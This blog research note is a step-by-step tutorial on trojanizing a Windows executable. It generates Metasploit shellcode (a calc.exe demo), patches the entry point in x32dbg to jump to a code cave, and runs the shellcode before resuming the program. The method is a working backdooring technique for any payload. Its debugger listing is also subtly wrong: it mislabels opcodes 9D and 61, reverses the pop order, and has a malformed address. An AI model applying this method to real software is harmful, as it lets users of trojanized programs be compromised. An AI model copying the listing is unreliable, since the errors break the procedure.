<!doctype html><html lang=en-us><head><title>Embedding Shellcode Code Caves // Research Notes</title>
<link rel="shortcut icon" href=favicon.ico><meta charset=utf-8><meta name=generator content="Hugo 0.127.0"><meta name=format-detection content="telephone=no"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=author content="Martin Stoynov"><meta name=description content><link rel=stylesheet href=/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css><link rel=stylesheet href=/custom.css><meta name=twitter:card content="summary"><meta name=twitter:title content="Embedding Shellcode Code Caves"><meta name=twitter:description content="Theory Load malicious bytes into the “code cave” of a portable executable.
This doesn’t change the file size, because you will be replacing bytes that already exist with malicious code.
Typically, when a PE file executes, it follows the instructions from top to bottom. In contrary, when a trojan executes, it will immediately jump to the section containing the shellcode, execute the it and then return back the top of the file and run the program as usual."><meta property="og:url" content="/notes/embedding-shellcode-in-code-caves/"><meta property="og:site_name" content="Research Notes"><meta property="og:title" content="Embedding Shellcode Code Caves"><meta property="og:description" content="Theory Load malicious bytes into the “code cave” of a portable executable.
This doesn’t change the file size, because you will be replacing bytes that already exist with malicious code.
Typically, when a PE file executes, it follows the instructions from top to bottom. In contrary, when a trojan executes, it will immediately jump to the section containing the shellcode, execute the it and then return back the top of the file and run the program as usual."><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="notes"><meta property="article:published_time" content="2024-02-10T00:00:00+00:00"><meta property="article:modified_time" content="2024-02-10T00:00:00+00:00"><meta property="article:tag" content="C++"><meta property="article:tag" content="WinAPI"><meta property="article:tag" content="Metasploit"><link rel=alternate type=application/rss+xml href=/index.xml title="Research Notes"></head><body><header class=app-header><a href=/><img class=app-header-avatar src=/avatar.jpg alt="Martin Stoynov"></a><h1>Research Notes</h1><nav class=app-header-menu><a class=app-header-menu-item href=/notes/>Notes</a>
-
<a class=app-header-menu-item href=/tags/>Tags</a></nav><p>A Zettelkasten-style digital garden of evolving research notes.</p><div class=app-header-social><a href=https://github.com/martinstnv target=_blank rel="noreferrer noopener"><svg class="icon icon-github" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>github</title><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg>
</a><a href=https://linkedin.com/in/martinstnv target=_blank rel="noreferrer noopener"><svg class="icon icon-linkedin" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>linkedin</title><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg>
</a><a href=https://infosec.exchange/@martinstnv target=_blank rel="noreferrer noopener"><svg class="icon icon-brand-mastodon" viewBox="0 0 24 24" fill="currentcolor"><title>Mastodon</title><path d="M23.268 5.313c-.35-2.578-2.617-4.61-5.304-5.004C17.51.242 15.792.0 11.813.0h-.03c-3.98.0-4.835.242-5.288.309C3.882.692 1.496 2.518.917 5.127.64 6.412.61 7.837.661 9.143c.074 1.874.088 3.745.26 5.611.118 1.24.325 2.47.62 3.68.55 2.237 2.777 4.098 4.96 4.857 2.336.792 4.849.923 7.256.38.265-.061.527-.132.786-.213.585-.184 1.27-.39 1.774-.753a.057.057.0 00.023-.043v-1.809a.052.052.0 00-.02-.041.053.053.0 00-.046-.01 20.282 20.282.0 01-4.709.545c-2.73.0-3.463-1.284-3.674-1.818a5.593 5.593.0 01-.319-1.433.053.053.0 01.066-.054c1.517.363 3.072.546 4.632.546.376.0.75.0 1.125-.01 1.57-.044 3.224-.124 4.768-.422.038-.008.077-.015.11-.024 2.435-.464 4.753-1.92 4.989-5.604.008-.145.03-1.52.03-1.67.002-.512.167-3.63-.024-5.545zm-3.748 9.195h-2.561V8.29c0-1.309-.55-1.976-1.67-1.976-1.23.0-1.846.79-1.846 2.35v3.403h-2.546V8.663c0-1.56-.617-2.35-1.848-2.35-1.112.0-1.668.668-1.67 1.977v6.218H4.822V8.102c0-1.31.337-2.35 1.011-3.12.696-.77 1.608-1.164 2.74-1.164 1.311.0 2.302.5 2.962 1.498l.638 1.06.638-1.06c.66-.999 1.65-1.498 2.96-1.498 1.13.0 2.043.395 2.74 1.164.675.77 1.012 1.81 1.012 3.12z"/></svg></a></div></header><main class=app-container><article class=post><header class=post-header><h1 class=post-title>Embedding Shellcode Code Caves</h1><div class=post-meta><div><svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
Feb 10, 2024</div><div><svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
3 min read</div><div><svg class="icon icon-tag" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>tag</title><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7.01" y2="7"/></svg>
<a class=tag href=/tags/c++/>C++</a>
<a class=tag href=/tags/winapi/>WinAPI</a>
<a class=tag href=/tags/metasploit/>Metasploit</a></div></div></header><div class=post-content><h2 id=theory>Theory</h2><p>Load malicious bytes into the “code cave” of a portable executable.</p><blockquote><p>This doesn’t change the file size, because you will be replacing bytes that already exist with malicious code.</p></blockquote><p>Typically, when a PE file executes, it follows the instructions from top to bottom. In contrary, when a trojan executes, it will immediately jump to the section containing the shellcode, execute the it and then return back the top of the file and run the program as usual.</p><h2 id=practice>Practice</h2><p>Generate shellcode using Metasploit.</p><pre tabindex=0><code>use payload/windows/exec
set CMD calc.exe
set EXITFUNC thread
generate -f raw -o calc.bin
</code></pre><p>Alternatively, you can use a 64-bit shellcode using the following module.</p><pre tabindex=0><code>use payload/windows/×64/exec
</code></pre><p>Use xxd to get an overfile of the shellcode.</p><pre tabindex=0><code>xxd calc.bin
</code></pre><blockquote><p>The final null byte indicates the end of the shellcode.</p></blockquote><p>Create the following source file. <em>(Note that this is C, and not C++)</em></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;windows.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#pragma comment (lib, &#34;user32.lib&#34;)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(VOID) {
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  MessageBox (
</span></span><span style=display:flex><span>    NULL,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;My first trojan!&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;Malware Development&#34;</span>,
</span></span><span style=display:flex><span>    MB_ICONEXCLAMATION <span style=color:#f92672>|</span> MB_OK
</span></span><span style=display:flex><span>  );
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Compile the source code.</p><pre tabindex=0><code>cl.exe /Zi /EHsc /nologo /FeC:\path\to\save\output\file.exe C:\path\to\get\source\file.c
</code></pre><p>Launch <code>x32dbg.exe</code> and attach the portable executable.</p><p>First, take note of the entry point address.</p><pre tabindex=0><code>002E1136 | E9 C1630000            | jmp ‹main._mainCRTStartup&gt;    |
</code></pre><p>Second, take note of the “code cave” address.</p><pre tabindex=0><code>00345D2C |    0000                | add byte ptr ds:[eax],al      |
</code></pre><p>Override the entry point instruction to make jump to the address of the code cave.</p><pre tabindex=0><code>jmp 00345D2C
</code></pre><blockquote><p>Make sure to have “<em>Fill with NOPs</em>” and “<em>XED Parse</em>” options enabled.</p></blockquote><p>The entry point should now be the following.</p><pre tabindex=0><code>002E1136 | E9 F14B0600            | jmp main.345D2C                 |
</code></pre><p>Navigate to the code cave and override the first two lines to push all of the general registers and eflags on the stack, in order to have them saved and pulled back down later to have the program execute as usual.</p><pre tabindex=0><code>00345D2C | 60                     | pushad                         |
00345D2D | 9C                     | pushfd                         |
</code></pre><p>Open the <code>calc.bin</code> in a HEX editor, such as <em>HxD</em> and copy the shellcode bytes.</p><p>Back in the <em>x32dbg</em> program, select enough lines and override them with the shellcode (SHIFT + DOWN and then CTRL + E).</p><p>After the shellcode has run, use popad and popfd to pull down the registers from the stack.</p><blockquote><p>Do not forget that the shellcode payload ends with a null byte.</p></blockquote><pre tabindex=0><code>00345DEE | 0000                   | add byte ptr ds:[eax],al       |
00345DFO | 9D                     | popad                          |
00345DF1 | 61                     | popfd                          |
</code></pre><p>Restore the original command, that the entry point was supposed to run.</p><pre tabindex=0><code>jmp _mainCRTStartup
</code></pre><p>The line would be automatically reformated to the following.</p><pre tabindex=0><code>00345DF2 | E9 0517FAFF            | jmp ‹main._mainCRTStartup&gt;     |
</code></pre><p>Lastly, jump to the address below the entry point to make the program continue execute as normal, from top to bottom.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span><span style=color:#a6e22e>jmp</span> <span style=color:#ae81ff>002</span>E113B
</span></span></code></pre></div><p>The line would be automatically reformated to the following</p><pre tabindex=0><code>00345DF7 | E9 3FB3F9FF            | jmp main.2E113B
</code></pre><h2 id=common-bugs>Common Bugs</h2><p>Often times the shellcode with exit without executing the original program code.</p><p>Place breakpoints on each call that the shellcode makes and follow through the debugging process till it executes the intended malicious command. Below it there should be an exit instruction, such as a <code>push 0</code> instruction, which should be replaced with a jump to to the part where the registers are stored on the stack (<code>jmp 00345D2C</code>).</p><h2 id=references>References</h2><ul><li><a href=https://pdos.csail.mit.edu/6.828/2008/readings/i386/PUSHF.htm>https://pdos.csail.mit.edu/6.828/2008/readings/i386/PUSHF.htm</a></li><li><a href=https://pdos.csail.mit.edu/6.828/2008/readings/i386/PUSHA.htm>https://pdos.csail.mit.edu/6.828/2008/readings/i386/PUSHA.htm</a></li><li><a href=https://pdos.csail.mit.edu/6.828/2008/readings/i386/POPF.htm>https://pdos.csail.mit.edu/6.828/2008/readings/i386/POPF.htm</a></li><li><a href=https://pdos.csail.mit.edu/6.828/2008/readings/i386/POPA.htm>https://pdos.csail.mit.edu/6.828/2008/readings/i386/POPA.htm</a></li><li><a href=https://mh-nexus.de/en/hxd/>https://mh-nexus.de/en/hxd/</a></li></ul></div><div class=post-footer></div></article></main></body></html>